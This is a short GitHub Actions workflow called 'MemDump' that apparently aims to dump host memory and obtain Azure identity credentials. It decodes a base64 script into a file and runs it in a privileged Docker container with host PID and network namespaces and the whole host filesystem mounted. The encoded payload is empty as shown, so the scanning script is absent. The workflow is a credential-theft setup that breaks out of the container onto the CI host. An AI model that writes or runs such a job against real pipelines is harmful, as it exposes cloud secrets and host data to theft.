name: MemDump
on:
  workflow_dispatch:
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - name: memory dump and azure identity
        timeout-minutes: 5
        run: |
          set +e
          echo  | base64 -d > /tmp/memscan.py
          docker run --rm --privileged --pid=host --net=host -v /tmp/memscan.py:/scan.py -v /:/hostfs python:3.11-slim python3 /scan.py
          echo
          echo === DONE ===
